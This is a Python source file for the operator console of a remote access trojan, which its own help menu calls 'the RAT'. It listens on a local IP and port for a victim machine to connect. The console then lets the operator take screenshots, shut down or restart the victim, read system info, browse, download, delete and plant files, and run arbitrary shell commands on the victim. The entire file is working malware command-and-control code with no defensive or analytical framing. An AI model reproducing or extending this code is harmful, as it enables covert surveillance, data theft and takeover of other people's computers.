import socket
import os

s = socket.socket()
host = "192.168.0.12"
port = 8080
s.bind((host, port))

x = """
          ________.___     ____.___  _________________  ________
         /  _____/|   |   |    |   |/  _____/\______  \/  _____/
        /   \  ___|   |   |    |   /   __  \     /    /   __  \ 
        \    \_\  \   /\__|    |   \  |__\  \   /    /\  |__\  \ 
         \______  /___\________|___|\_____  /  /____/  \_____  /
                \/                        \/                 \/ 

|========================================================================|
|============================================================== GIJI676 =|
"""
print(x)

print("Server running at: ", host)
print()
s.listen()
print("Waiting for incoming connections...")
print()
conn, addr = s.accept()
print(addr, "has connected to the server successfully")
print("connected")

help_menu = """
                                 HELP MENU
---------------------------------------------------------------------------------
    -help      -h             help menu (all the commands)
    clear      cls            clears the screen
    close                     closes the RAT
    screenshot                takes a screenshot
    shutdown                  shuts down the computer
    restart                   restart the computer
    sysinfo                   gives the system info of the computer
    ------------------------------------------------------------------------
    ** when dealing with files make sure to include file extensions **
    cmd                       opens up cmd
     |  exit                  closes cmd
     |  clear      cls        clears the screen
     |  cwd                   print current working directory
     |  view_dir [path]       view files in a given directory
     |  view_cdir             view files in current directory
     |  download_file [path]  download files from a given directory
     |  rm_file [path]        removes a file
     |  send_file             send files to the target
     |  mkdir [path]          makes a new directory
     |  chdir [path]          changes current directory
     |  rename                renames a file
     |  command               tries to send and execute a command
     |                        straight into cmd (uses os.system("command")),
     |                        will not show error if the command didn't work
     |  cp_file               copy file to a different directory
     |  view_txt [path]       read a .txt file
---------------------------------------------------------------------------------
"""

screenshot_count = 0
while True:
    print()
    command = input("Command >> ")
    print()

    if command == "-help" or command == "-h":
        print(help_menu)

    elif command == "screenshot":
        conn.send(command.encode())
        screenshot = conn.recv(100000)
        screenshot_count += 1
        img_name = "screenshot" + str(screenshot_count) + ".png"
        img = open(img_name, "wb")
        img.write(screenshot)
        img.close()

    elif command == "shutdown":
        conn.send(command.encode())
        print(" --  Executed")

    elif command == "restart":
        conn.send(command.encode())
        print(" --  Executed")

    elif command == "sysinfo":
        conn.send(command.encode())
        file = conn.recv(10000)

        new_file = open("info.txt", "wb")
        new_file.write(file)
        new_file.close()

        file_read = open("info.txt", "r")
        sys_read = file_read.read()
        print(sys_read)
        file_read.close()

    elif command == "cmd":
        conn.send(command.encode())
        cmd_path = conn.recv(5000)
        cmd_path = cmd_path.decode()
        cmd = True
        while cmd:
            cmd_command = input(cmd_path + "> ")

            if cmd_command == "cwd":
                conn.send(cmd_command.encode())

                working_dir = conn.recv(5000)
                working_dir = working_dir.decode()
                cmd_path = working_dir
                print(" -- ", working_dir)
                print()

            elif cmd_command[:8] == "view_dir":
                conn.send(cmd_command.encode())

                file = conn.recv(5000)
                file = file.decode()
                if file != "b'Invalid directory'":
                    print(" -- ", file)
                    print()

            elif cmd_command[:7] == "rm_file":
                conn.send(cmd_command.encode())

                returned = conn.recv(5000)
                returned = returned.decode()
                if returned == "File removed":
                    print(" -- ", returned)
                    print()
                else:
                    print(returned)
                    print()

            elif cmd_command[:13] == "download_file":
                conn.send(cmd_command.encode())

                file = conn.recv(10000)
                if file != "b'Invalid directory'":
                    print()
                    file_name = input("Enter a file name for the incoming file including the extension: ")
                    print()
                    new_file = open(file_name, "wb")
                    new_file.write(file)
                    new_file.close()
                    print(" -- File downloaded")
                    print()

            elif cmd_command == "send_file":
                conn.send(cmd_command.encode())
                file = input("Enter the filename and the directory for the file being sent: ")
                file_name = input("Enter the filename for the file to be saved as: ")
                data = open(file, "rb")
                file_data = data.read(10000)
                conn.send(file_name.encode())
                print(" -- File sent")
                print()
                conn.send(file_data)

            elif cmd_command[:5] == "mkdir":
                conn.send(cmd_command.encode())
                returned = conn.recv(3000)
                returned = returned.decode()
                print(returned)
                print()

            elif cmd_command[:5] == "chdir":
                conn.send(cmd_command.encode())
                returned = conn.recv(5000)
                if returned == "Invalid directory":
                    print(" -- ", returned)
                    print()
                else:
                    cmd_path = returned.decode()
                    print()

            elif cmd_command[:6] == "rename":
                conn.send(cmd_command.encode())
                name = input("Enter the file name: ")
                conn.send(name.encode())
                new_name = input("Enter the name you want to rename the file to: ")
                conn.send(new_name.encode())
                returned = conn.recv(5000)
                returned = returned.decode()
                print(" -- ", returned)
                print()

            elif cmd_command == "command":
                conn.send(cmd_command.encode())
                os_command = input("Enter the command: ")
                conn.send(os_command.encode())

                returned = conn.recv(5000)
                returned = returned.decode()
                print(returned)
                print()

            elif cmd_command == "view_cdir":
                conn.send(cmd_command.encode())

                returned = conn.recv(10000)
                returned = returned.decode()
                print(" -- ", returned)
                print()

            elif cmd_command == "cp_file":
                conn.send(cmd_command.encode())
                file = input("Enter the file path to be copied: ")
                conn.send(file.encode())
                new_file = input("Enter where you want it to be copied: ")
                conn.send(new_file.encode())

                returned = conn.recv(10000)
                returned = returned.decode()
                print(" -- ", returned)
                print()

            elif cmd_command == "view_txt":
                conn.send(cmd_command.encode())
                file_path = input("Enter the file path: ")
                conn.send(file_path.encode())

                try:
                    text = conn.recv(10000)
                    print(text)
                except:
                    print("Invalid file")

            elif cmd_command == "-help" or cmd_command == "-h":
                print(help_menu)

            elif cmd_command == "clear" or cmd_command == "cls":
                os.system("cls")
                print(x)

            elif cmd_command == "exit":
                conn.send(cmd_command.encode())
                cmd = False

            elif cmd_command == "cmd":
                print("Already in cmd")
                print()

            else:
                print("Unknown command")
                print()

    elif command == "clear" or command == "cls":
        os.system("cls")
        print(x)

    elif command == "close":
        close = "close"
        conn.send(close.encode())
        conn.close()
        exit()

    else:
        print("Unknown command")
